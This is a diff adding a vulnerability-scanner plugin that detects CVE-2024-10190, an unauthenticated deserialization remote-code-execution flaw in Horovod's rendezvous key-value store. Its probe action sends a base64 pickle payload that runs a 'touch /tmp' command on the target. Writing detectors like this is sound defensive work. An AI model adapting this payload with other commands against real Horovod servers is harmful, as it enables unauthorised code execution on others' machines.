@@ -1,0 +1,93 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Horovod_CVE_2024_10190"
+  author: "sanjaymahajan14"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2024-10190"
+  }
+  severity: CRITICAL
+  title: "Horovod Insecure Deserialization Rendezvous Server RCE"
+  description: "An insecure deserialization vulnerability exists in Horovod versions up to 0.28.1 within the HTTP key-value store and rendezvous handler components (KVStoreHandler). Unauthenticated attackers can send serialized cloudpickle payloads via HTTP PUT requests to arbitrary scopes/keys, leading to remote code execution."
+  recommendation: "Upgrade Horovod to version 0.28.2 or later, restrict access to rendezvous and coordination ports via network segmentation, and avoid pickle-based serialization for network transport."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-10190"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_horovod_rendezvous"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 400
+      expect_any: {
+        conditions: [
+          { header: { name: "Server" } contains: "SimpleHTTP" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "probe_kvstore_insecure_deserialization"
+  http_request: {
+    method: PUT
+    uri: "/cve_test_scope/probe_key"
+    headers: [
+      { name: "Content-Type" value: "application/octet-stream" }
+    ]
+    data: "gAWVQQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlIwMdG91Y2ggL3RtcC9jdGVfdGVzdC50eHSFlFKULg=="
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "verify_key_stored"
+  http_request: {
+    method: GET
+    uri: "/cve_test_scope/probe_key"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "gAWVQQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlIwMdG91Y2gg" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_horovod_rendezvous",
+    "probe_kvstore_insecure_deserialization",
+    "verify_key_stored"
+  ]
+}
